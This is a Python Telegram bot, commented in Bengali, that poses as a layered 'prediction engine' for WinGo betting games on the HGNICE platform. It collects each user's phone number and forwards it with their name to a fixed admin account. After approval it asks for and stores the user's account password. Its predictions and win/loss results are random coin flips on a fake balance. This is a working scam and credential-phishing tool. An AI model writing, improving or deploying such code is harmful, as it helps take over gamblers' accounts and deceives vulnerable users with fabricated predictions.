import os
import asyncio
import logging
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ================== কনফিগারেশন ==================
# Railway-তে BOT_TOKEN ভেরিয়েবল সেট করলে এটি স্বয়ংক্রিয়ভাবে সেখান থেকে টোকেন নেবে
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 8164888241  # আপনার অ্যাডমিন আইডি
# ================================================

user_states = {}
pending_users = {}  # পেন্ডিং ইউজারদের তথ্য জমা রাখার জন্য

def get_state(uid):
    if uid not in user_states:
        user_states[uid] = {
            "logged_in": False,
            "awaiting": None,
            "phone": "",
            "password": "",
            "balance": 1000.0,  # ডেমো ব্যালেন্স
            "game": None,
            "total_steps": 0,
            "steps": [],
            "step_idx": 0,
            "target": 0,
            "profit": 0,
            "running": False,
            "task": None,
            "approved": False,  # অ্যাডমিন অ্যাপ্রুভাল স্ট্যাটাস
        }
    return user_states[uid]

def gen_period(game_mode):
    return "2026101401001"

async def auto_bet_loop(uid, ctx):
    state = get_state(uid)
    try:
        while state["running"]:
            await asyncio.sleep(30)  # প্রতি ৩০ সেকেন্ড পর সিগন্যাল
            if not state["running"]:
                break

            if not state["steps"]:
                break
            current_step = state["steps"][state["step_idx"] % len(state["steps"])]

            if state["balance"] < current_step:
                state["running"] = False
                if uid != ADMIN_ID:
                    await ctx.bot.send_message(
                        chat_id=uid,
                        text=f"❌ **INSUFFICIENT BALANCE!**\n\n"
                             f"💰 আপনার বর্তমান ব্যালেন্স: `{state['balance']}`\n"
                             f"⚠️ পরবর্তী স্টেপ বেট: `{current_step}`\n"
                             f"অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকায় অটো-বেটিং বন্ধ করা হলো।",
                        parse_mode="Markdown"
                    )
                break

            p = gen_period(state["game"])
            prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
            is_win = random.choice([True, False])
            result_status = "🟢 WIN (+)" if is_win else "🔴 LOSS (-)"

            if is_win:
                state["balance"] += current_step
                state["profit"] += current_step
            else:
                state["balance"] -= current_step
                state["profit"] -= current_step

            msg = (
                f"🧠 **PREDICTION GENERATED** 🧠\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📌 **Period:** {p}\n"
                f"🎮 **Game:** WinGo {state['game'].upper()}\n"
                f"💰 **Current Step Bet:** {current_step}\n"
                f"🎨 **Result Type:** {prediction}\n"
                f"📊 **Outcome:** {result_status}\n"
                f"💵 **Updated Balance:** `{state['balance']}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ *Next prediction in 30 seconds...*"
            )
            try:
                # অ্যাডমিন ছাড়া বাকি সবার কাছে মেসেজ পাঠাবে
                if uid != ADMIN_ID:
                    await ctx.bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Loop message error: {e}")

    except asyncio.CancelledError:
        pass

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    # অ্যাডমিনের জন্য আলাদা প্যানেল
    if uid == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("📋 Pending Users", callback_data="admin_pending")],
            [InlineKeyboardButton("🔄 Refresh Panel", callback_data="admin_refresh")]
        ]
        await update.message.reply_text(
            "🛠️ **ADMIN CONTROL PANEL** 🛠️\n\n"
            "স্বাগতম! আপনি এখান থেকে ইউজারদের অ্যাপ্রুভ করতে পারবেন।",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    # সাধারণ ইউজারের জন্য
    state = get_state(uid)
    if state["approved"] and state["logged_in"] and state.get("game"):
        keyboard = [
            [
                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            f"✅ আপনি ইতিমধ্যে লগইন আছেন!\n💰 ব্যালেন্স: `{state['balance']}`\n🎯 গেম সিলেক্ট করুন:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    text = (
        "🧠 Prediction Engine — 9 Layers\n"
        "⚡ Streak • 🔷 Pattern • 📈 Trend\n\n"
        "👇 Press the button below to LOGIN"
    )

    keyboard = [[
        InlineKeyboardButton("🔐 LOGIN TO ACCOUNT", callback_data="start_login")
    ]]

    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "No Username"
    name = update.effective_user.first_name
    state = get_state(uid)
    text = update.message.text.strip()

    # ১. ফোন নম্বর নেওয়া
    if not state["logged_in"] and state.get("awaiting") == "phone":
        state["phone"] = text
        state["awaiting"] = "pending_approval"
        
        # পেন্ডিং লিস্টে যোগ করা
        pending_users[uid] = {"name": name, "username": username, "phone": text}

        await update.message.reply_text(
            "⏳ আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
        )

        admin_text = (
            "🔔 **NEW LOGIN REQUEST!**\n\n"
            f"👤 Name: {name}\n"
            f"🆔 User ID: `{uid}`\n"
            f"🔗 Username: @{username}\n"
            f"📱 Phone: `{text}`"
        )
        admin_keyboard = [[
            InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{uid}")
        ]]
        
        try:
            await ctx.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(admin_keyboard)
            )
        except Exception as e:
            print(f"Admin message error: {e}")
        return

    # ২. পাসওয়ার্ড নেওয়া
    if not state["logged_in"] and state.get("awaiting") == "password":
        state["password"] = text
        state["logged_in"] = True
        state["awaiting"] = None

        if state["balance"] <= 0:
            await update.message.reply_text(
                "❌ **ACCOUNT ERROR!**\nআপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই (`0` ব্যালেন্স)।",
                parse_mode="Markdown"
            )
            return

        await update.message.reply_text(
            f"✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*\n💰 একাউন্ট ব্যালেন্স: `{state['balance']}`",
            parse_mode="Markdown"
        )

        keyboard = [
            [
                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            "🎯 গেম সিলেক্ট করুন:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    # ৩. স্টেপ ও টার্গেট প্রসেসিং
    if state["logged_in"]:
        if state.get("awaiting") == "total_steps":
            try:
                total = int(text)
                if total <= 0:
                    raise ValueError()
                state["total_steps"] = total
                state["steps"] = []
                state["awaiting"] = "collecting_steps"
                await update.message.reply_text(
                    f"✅ মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে।\n\n👉 **স্টেপ ১ (Step 1)** এর মান লিখুন:"
                )
            except:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 5")
            return

        if state.get("awaiting") == "collecting_steps":
            try:
                val = float(text)
                state["steps"].append(val)
                current_count = len(state["steps"])
                total_needed = state["total_steps"]

                if current_count < total_needed:
                    await update.message.reply_text(
                        f"✅ স্টেপ {current_count} সংরক্ষিত হয়েছে।\n\n👉 **স্টেপ {current_count + 1}** এর মান লিখুন:"
                    )
                else:
                    state["awaiting"] = "target"
                    steps_str = ", ".join(map(str, state["steps"]))
                    await update.message.reply_text(
                        f"✅ **সব স্টেপগুলো সফলভাবে সেট হয়েছে:** `[{steps_str}]`\n\n🎯 এখন **TARGET PROFIT** দিন (যেমন: 500):",
                        parse_mode="Markdown"
                    )
            except:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন।")
            return

        if state.get("awaiting") == "target":
            try:
                tgt = float(text)
                state["target"] = tgt
                state["awaiting"] = None
                state["profit"] = 0
                state["running"] = True
                
                await update.message.reply_text(
                    f"🚀 *AUTO BETTING STARTED!* (30s interval)\n🎯 Target: *{tgt}*\n💰 Balance: `{state['balance']}`\n⏳ প্রেডিকশন শুরু হচ্ছে...",
                    parse_mode="Markdown",
                )
                if state.get("task"):
                    state["task"].cancel()
                state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
            except Exception as e:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 500")
            return

async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    state = get_state(uid)
    data = query.data

    # অ্যাডমিন প্যানেলের কলব্যাক
    if data == "admin_pending":
        if not pending_users:
            await query.edit_message_text("📭 কোনো পেন্ডিং ইউজার নেই।")
            return
        
        text = "📋 **PENDING USERS LIST:**\n\n"
        for u_id, info in pending_users.items():
            text += f"👤 {info['name']} (@{info['username']})\n📱 {info['phone']}\n🆔 `{u_id}`\n\n"
        
        await query.edit_message_text(text, parse_mode="Markdown")

    elif data == "admin_refresh":
        await query.edit_message_text("🔄 প্যানেল রিফ্রেশ করা হয়েছে। আবার /start দিন।")

    # ইউজার লগইন শুরু
    elif data == "start_login":
        state["awaiting"] = "phone"
        await query.message.reply_text("📱 আপনার HGNICE ফোন নম্বরটি লিখুন:")

    # অ্যাডমিন অ্যাপ্রুভ করলে
    elif data.startswith("approve_"):
        target_uid = int(data.split("_")[1])
        target_state = get_state(target_uid)
        target_state["approved"] = True  # ইউজারকে অ্যাপ্রুভ করা হলো
        target_state["awaiting"] = "password"

        # পেন্ডিং লিস্ট থেকে সরানো
        if target_uid in pending_users:
            del pending_users[target_uid]

        try:
            await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
        except:
            pass

        try:
            await ctx.bot.send_message(
                chat_id=target_uid,
                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার একাউন্টের পাসওয়ার্ড দিন:",
                parse_mode="Markdown",
            )
        except Exception as e:
            print(f"User notify error: {e}")

    # গেম সিলেক্ট
    elif data.startswith("game_"):
        if not state["approved"]:
            await query.message.reply_text("❌ আপনি এখনো অ্যাডমিন দ্বারা অনুমোদিত হননি।")
            return
        if not state["logged_in"]:
            await query.message.reply_text("❌ আগে লগইন করুন এবং পাসওয়ার্ড দিয়ে ভেরিফাই করুন।")
            return
        mode = data.split("_")[1]
        state["game"] = mode
        state["awaiting"] = "total_steps"
        await query.edit_message_text(
            f"🎮 *WinGo {mode.upper()} SELECTED*\n\n"
            f"🔢 আপনি মোট কয়টি স্টেপ দিতে চান?\n*(উদাহরণস্বরূপ: 5 লিখুন)*",
            parse_mode="Markdown",
        )

def main():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN is missing! Please set it in the environment variables.")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
